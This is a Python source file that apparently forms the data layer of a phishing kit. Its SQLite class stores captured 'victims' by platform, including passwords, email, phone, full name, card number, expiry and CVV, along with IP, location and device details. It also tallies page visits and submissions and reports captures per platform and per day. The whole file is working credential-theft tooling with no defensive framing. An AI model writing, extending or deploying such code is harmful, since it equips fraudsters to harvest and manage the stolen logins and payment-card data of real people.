import sqlite3
import json
from datetime import datetime

class Database:
    def __init__(self, db_path):
        self.db_path = db_path
        self._init_db()
    
    def _init_db(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            
            # Victims table
            c.execute("""
                CREATE TABLE IF NOT EXISTS victims (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    platform TEXT,
                    username TEXT,
                    password TEXT,
                    email TEXT,
                    phone TEXT,
                    full_name TEXT,
                    card_number TEXT,
                    card_expiry TEXT,
                    card_cvv TEXT,
                    ip TEXT,
                    country TEXT,
                    city TEXT,
                    user_agent TEXT,
                    browser TEXT,
                    os TEXT,
                    device TEXT,
                    timestamp TEXT,
                    additional_data TEXT
                )
            """)
            
            # Stats table
            c.execute("""
                CREATE TABLE IF NOT EXISTS stats (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    total_visits INTEGER DEFAULT 0,
                    total_submissions INTEGER DEFAULT 0,
                    last_submission TEXT
                )
            """)
            c.execute("INSERT OR IGNORE INTO stats (id) VALUES (1)")
            
            # Settings table
            c.execute("""
                CREATE TABLE IF NOT EXISTS settings (
                    key TEXT PRIMARY KEY,
                    value TEXT
                )
            """)
            c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('dark_mode', 'false')")
            c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('maintenance', 'false')")
            
            conn.commit()
    
    def add_victim(self, data):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute("""
                INSERT INTO victims (
                    platform, username, password, email, phone, full_name,
                    card_number, card_expiry, card_cvv,
                    ip, country, city, user_agent, browser, os, device,
                    timestamp, additional_data
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                data.get('platform'),
                data.get('username'),
                data.get('password'),
                data.get('email'),
                data.get('phone'),
                data.get('full_name'),
                data.get('card_number'),
                data.get('card_expiry'),
                data.get('card_cvv'),
                data.get('ip'),
                data.get('country'),
                data.get('city'),
                data.get('user_agent'),
                data.get('browser'),
                data.get('os'),
                data.get('device'),
                datetime.now().isoformat(),
                json.dumps(data.get('additional_data', {}))
            ))
            c.execute("UPDATE stats SET total_submissions = total_submissions + 1, last_submission = datetime('now')")
            conn.commit()
    
    def increment_visits(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute("UPDATE stats SET total_visits = total_visits + 1")
            conn.commit()
    
    def get_stats(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute("SELECT total_visits, total_submissions, last_submission FROM stats")
            return c.fetchone()
    
    def get_all_victims(self, limit=100):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            c.execute("SELECT * FROM victims ORDER BY id DESC LIMIT ?", (limit,))
            return [dict(row) for row in c.fetchall()]
    
    def get_recent_victims(self, limit=10):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            c.execute("SELECT * FROM victims ORDER BY id DESC LIMIT ?", (limit,))
            return [dict(row) for row in c.fetchall()]
    
    def delete_victim(self, victim_id):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute("DELETE FROM victims WHERE id = ?", (victim_id,))
            conn.commit()
    
    def clear_all(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute("DELETE FROM victims")
            conn.commit()
    
    def get_platform_stats(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute("""
                SELECT platform, COUNT(*) as count 
                FROM victims 
                GROUP BY platform 
                ORDER BY count DESC
            """)
            return c.fetchall()
    
    def get_daily_stats(self, days=7):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute("""
                SELECT date(timestamp) as date, COUNT(*) as count
                FROM victims
                WHERE date(timestamp) >= date('now', ?)
                GROUP BY date(timestamp)
                ORDER BY date(timestamp) DESC
            """, (f'-{days} days',))
            return c.fetchall()
